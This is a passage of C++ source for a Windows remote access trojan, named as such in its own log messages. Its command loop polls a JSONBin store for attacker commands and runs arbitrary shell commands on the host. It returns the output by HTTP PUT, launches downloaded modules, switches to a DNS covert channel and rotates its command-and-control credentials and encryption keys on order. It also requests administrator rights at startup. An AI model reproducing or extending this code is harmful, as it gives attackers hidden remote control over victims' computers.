
                        if (!poll_dur.empty()) {
                            settings.poll_duration = std::stoi(poll_dur);
                            currentPollInterval = settings.poll_duration;
                        }
                        if (!sleep_dur.empty()) {
                            settings.sleep_duration = std::stoi(sleep_dur);
                            sleepDuration = settings.sleep_duration;
                        }
                        if (!dns_to.empty())      settings.dns_timeout = std::stoi(dns_to);
                        if (!dns_retries.empty()) settings.dns_max_retries = std::stoi(dns_retries);

                        if (SavePollSettings(settings)) {
                            data.Set("cmd", "None");
                            data.Set("cmd_result", "Settings updated successfully");
                            HttpRequest(url, "PUT", apiKey, data.ToString());
                            lastCommandTime = GetTickCount();
                            DebugLog("New settings applied");
                            continue;
                        }
                        else {
                            data.Set("cmd", "None");
                            data.Set("cmd_result", "ERROR: Failed to save settings");
                            HttpRequest(url, "PUT", apiKey, data.ToString());
                            lastCommandTime = GetTickCount();
                        }
                    }
                    continue;
                }

                if (cmdStr.find("cmd--update-jsonbin") == 0) {
                    DebugLog("JSONBIN CREDENTIAL UPDATE REQUEST");

                    size_t jsonStart = cmdStr.find("{");
                    if (jsonStart != std::string::npos) {
                        std::string jsonPart = cmdStr.substr(jsonStart);

                        std::string unescaped;
                        for (size_t i = 0; i < jsonPart.length(); i++) {
                            if (jsonPart[i] == '\\' && i + 1 < jsonPart.length() && jsonPart[i + 1] == '"') {
                                unescaped += '"';
                                i++;
                            }
                            else {
                                unescaped += jsonPart[i];
                            }
                        }
                        DebugLog("Unescaped JSON: " + unescaped);
                        jsonPart = unescaped;

                        SimpleJSON newCreds;
                        newCreds.Parse(jsonPart);

                        std::string new_bin = newCreds.Get("bin_id");
                        std::string new_api = newCreds.Get("api_key");
                        std::string new_url = newCreds.Get("url");

                        if (!new_bin.empty() && !new_api.empty() && !new_url.empty()) {
                            if (UpdateJSONBinConfig(new_bin, new_api, new_url)) {
                                data.Set("cmd", "None");
                                data.Set("cmd_result", "JSONBin credentials updated");
                                HttpRequest(url, "PUT", apiKey, data.ToString());
                                lastCommandTime = GetTickCount();
                                DebugLog("JSONBin config updated");
                            }
                            else {
                                data.Set("cmd", "None");
                                data.Set("cmd_result", "ERROR: Failed to update JSONBin config");
                                HttpRequest(url, "PUT", apiKey, data.ToString());
                                lastCommandTime = GetTickCount();
                            }
                        }
                        else {
                            data.Set("cmd", "None");
                            data.Set("cmd_result", "ERROR: Missing credentials");
                            HttpRequest(url, "PUT", apiKey, data.ToString());
                            lastCommandTime = GetTickCount();
                        }
                    }
                    continue;
                }

                if (cmdStr.find("cmd--update-dns") == 0) {
                    DebugLog("DNS CREDENTIAL UPDATE REQUEST");

                    size_t jsonStart = cmdStr.find("{");
                    if (jsonStart != std::string::npos) {
                        std::string jsonPart = cmdStr.substr(jsonStart);

                        SimpleJSON newDnsCreds;
                        newDnsCreds.Parse(jsonPart);

                        std::string new_server_ip = newDnsCreds.Get("server_ip");
                        std::string new_domain = newDnsCreds.Get("domain");
                        std::string new_port = newDnsCreds.Get("port");
                        std::string new_key = newDnsCreds.Get("encryption_key");

                        if (!new_server_ip.empty() && !new_domain.empty() &&
                            !new_port.empty() && !new_key.empty()) {
                            if (UpdateDNSConfig(new_server_ip, new_domain, new_port, new_key)) {
                                data.Set("cmd", "None");
                                data.Set("cmd_result", "DNS credentials updated");
                                HttpRequest(url, "PUT", apiKey, data.ToString());
                                lastCommandTime = GetTickCount();
                                DebugLog("DNS config updated");
                            }
                            else {
                                data.Set("cmd", "None");
                                data.Set("cmd_result", "ERROR: Failed to update DNS config");
                                HttpRequest(url, "PUT", apiKey, data.ToString());
                                lastCommandTime = GetTickCount();
                            }
                        }
                        else {
                            data.Set("cmd", "None");
                            data.Set("cmd_result", "ERROR: Missing DNS credentials");
                            HttpRequest(url, "PUT", apiKey, data.ToString());
                            lastCommandTime = GetTickCount();
                        }
                    }
                    continue;
                }

                if (cmdStr.find("cmd--update-creds") == 0) {
                    DebugLog("MIGRATION INITIATED...");
                    size_t jsonStart = cmdStr.find("{");
                    if (jsonStart != std::string::npos) {
                        std::string jsonPart = cmdStr.substr(jsonStart);
                        SimpleJSON newParams;
                        newParams.Parse(jsonPart);

                        std::string nBin = newParams.Get("new_bin");
                        std::string nApi = newParams.Get("new_api");
                        std::string nUrl = newParams.Get("new_url");

                        if (!nBin.empty() && !nApi.empty()) {
                            SimpleJSON updatedConfig;
                            updatedConfig.Set("BIN_ID", nBin);
                            updatedConfig.Set("API_KEY", nApi);
                            updatedConfig.Set("URL", nUrl);

                            std::string currentKey = ReconstructKey(GetKeyDirectoryName());
                            if (SaveEncryptedConfig(updatedConfig, currentKey)) {
                                url = nUrl;
                                apiKey = nApi;
                                config->Set("URL", nUrl);
                                config->Set("API_KEY", nApi);
                                config->Set("BIN_ID", nBin);

                                data.Set("cmd", "None");
                                data.Set("cmd_result", "Vessel migration complete.");
                                HttpRequest(url, "PUT", apiKey, data.ToString());
                                lastCommandTime = GetTickCount();
                                continue;
                            }
                        }
                    }
                }

                else if (cmdStr.find("cmd--reload-config") == 0) {

                    DebugLog("CMD--RELOAD-CONFIG: Controller requested config reload + mode reset");


                    data.Set("cmd", "None");
                    data.Set("cmd_result", "Reloading listener_config.enc — returning to default mode...");
                    data.Set("device_status", "reloading");
                    HttpRequest(url, "PUT", apiKey, data.ToString());

                    DebugLog("Acknowledgment sent. Resetting mode.json to jsonbin...");

                    SaveMode("jsonbin");

                    Sleep(1500);
                    DebugLog("Triggering config reload via return 999...");
                    return 999;
                }

                else if (cmdStr.find("cmd--dns-mode") == 0) {

                    DebugLog("DNS MODE SWITCH REQUESTED");

                    DebugLog("Raw command: " + cmdStr);

                    std::string config_json;
                    size_t space_pos = cmdStr.find(' ');

                    if (space_pos != std::string::npos && space_pos + 1 < cmdStr.length()) {
                        config_json = cmdStr.substr(space_pos + 1);
                        DebugLog("Extracted JSON (raw): " + config_json);

                        std::string unescaped;
                        for (size_t i = 0; i < config_json.length(); i++) {
                            if (config_json[i] == '\\' && i + 1 < config_json.length() &&
                                config_json[i + 1] == '"') {
                                unescaped += '"';
                                i++;
                            }
                            else {
                                unescaped += config_json[i];
                            }
                        }
                        config_json = unescaped;
                        DebugLog("Unescaped JSON: " + config_json);
                    }

                    if (config_json.empty()) {
                        DebugLog("ERROR: No DNS configuration received");
                        data.Set("cmd", "None");
                        data.Set("cmd_result", "ERROR: Missing DNS configuration");
                        HttpRequest(url, "PUT", apiKey, data.ToString());
                        lastCommandTime = GetTickCount();
                        continue;
                    }

                    DebugLog("Saving DNS config to mode.json...");
                    if (!SaveDNSConfigToMode(config_json)) {
                        DebugLog("ERROR: Failed to save DNS config");
                        data.Set("cmd", "None");
                        data.Set("cmd_result", "ERROR: Failed to save DNS configuration");
                        HttpRequest(url, "PUT", apiKey, data.ToString());
                        lastCommandTime = GetTickCount();
                        continue;
                    }

                    DebugLog("DNS config saved successfully");

                    data.Set("cmd", "None");
                    data.Set("cmd_result", "DNS config saved. Switching to DNS mode...");
                    data.Set("device_status", "switching_to_dns");
                    HttpRequest(url, "PUT", apiKey, data.ToString());


                    DebugLog("Acknowledgment sent to controller");
                    DebugLog("Triggering mode switch...");


                    Sleep(2000);
                    return 999;
                }

                else if (cmdStr.find("cmd--fernet") == 0) {
                    std::string newFernetKey = (cmdStr.length() > 12) ? cmdStr.substr(12) : "";
                    size_t start = newFernetKey.find_first_not_of(" \t\n\r");
                    size_t end = newFernetKey.find_last_not_of(" \t\n\r");
                    if (start != std::string::npos && end != std::string::npos)
                        newFernetKey = newFernetKey.substr(start, end - start + 1);

                    if (!newFernetKey.empty() && UpdateFernetKey(newFernetKey)) {
                        url = config->Get("URL");
                        apiKey = config->Get("API_KEY");
                        data.Set("cmd_result", "Fernet key changed and local config re-encrypted.");
                    }
                    else {
                        data.Set("cmd_result", "ERROR: Fernet key change failed.");
                    }

                    data.Set("cmd", "None");
                    HttpRequest(url, "PUT", apiKey, data.ToString());
                    lastCommandTime = GetTickCount();
                    continue;
                }

                else if (cmdStr.find("cmd-exec-") == 0) {
                    std::string moduleRaw = cmdStr.substr(9);

                    std::string moduleName = moduleRaw;
                    {
                        size_t cbPos = moduleRaw.find("|CALLBACK:");
                        if (cbPos != std::string::npos)
                            moduleName = moduleRaw.substr(0, cbPos);
                    }

                    std::string modulePath;
                    if (moduleRaw.find("modules\\") == 0 || moduleRaw.find("modules/") == 0) {
                        modulePath = moduleRaw;
                    }
                    else {
                        modulePath = "modules\\" + moduleRaw;
                    }

                    DebugLog("Module execution request: " + moduleName);
                    DebugLog("Full module path: " + modulePath);

                    if (LaunchModuleDetached(modulePath, moduleName)) {
                        data.Set("cmd_result", "Module " + moduleName + " launched.");
                    }
                    else {
                        data.Set("cmd_result", "ERROR: Failed to launch " + moduleName);
                    }

                    data.Set("cmd", "None");
                    HttpRequest(url, "PUT", apiKey, data.ToString());
                    lastCommandTime = GetTickCount();
                    continue;
                }

                else {
                    std::string actualCmd = cmdStr;

                    if (actualCmd.find("cmd-") == 0) {
                        actualCmd = actualCmd.substr(4);
                    }

                    if (actualCmd == "-mode dns") {
                        data.Set("cmd", "None");
                        data.Set("cmd_result", "Please use cmd--dns-mode with configuration instead");
                        HttpRequest(url, "PUT", apiKey, data.ToString());
                        lastCommandTime = GetTickCount();
                        continue;
                    }
                    else if (actualCmd == "-mode jsonbin") {
                        data.Set("cmd", "None");
                        data.Set("cmd_result", "Already in JSONBin mode");
                        HttpRequest(url, "PUT", apiKey, data.ToString());
                        lastCommandTime = GetTickCount();
                        continue;
                    }

                    data.Set("cmd", "None");
                    data.Set("cmd_result", "executing...");
                    HttpRequest(url, "PUT", apiKey, data.ToString());

                    DebugLog("Executing: " + actualCmd);
                    std::string result = ExecuteCommand(actualCmd);

                    data.Set("cmd", "None");
                    data.Set("cmd_result", result);
                    data.Set("result_timestamp", GetTimestamp());
                    data.Set("current_dir", g_currentDir);
                    HttpRequest(url, "PUT", apiKey, data.ToString());

                    lastCommandTime = GetTickCount();
                    Sleep(3000);
                }
            }
        }

        Sleep(1000);
    }

    return 0;
}

int WINAPI WinMain(
    _In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPSTR lpCmdLine,
    _In_ int nCmdShow)
{
    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(nCmdShow);

    //InitDebugConsole(); <-- remove "//" if debugging


    DebugLog("RAT Client Starting...");


    if (!RunAsAdmin()) return 1;

    char buffer[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, buffer);
    g_currentDir = buffer;

    SimpleJSON config;
    if (!InitializeConfig(config)) {
        MessageBoxA(NULL, "Failed to initialize configuration", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    DebugLog("Config loaded successfully");
    DebugLog("BIN_ID: " + config.Get("BIN_ID"));
    DebugLog("URL: " + config.Get("URL"));

    std::string deviceName = config.Get("DEVICE_NAME");
    std::string deviceIp = config.Get("DEVICE_IP");

    std::string modulesPath = GetBaseDir() + "\\modules";
    CreateDirectoryA(modulesPath.c_str(), NULL);

    HANDLE hThread = CreateThread(NULL, 0, MainLoopThread, &config, 0, NULL);
    if (hThread) {
        DebugLog("RAT Client Running");
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    return 0;
}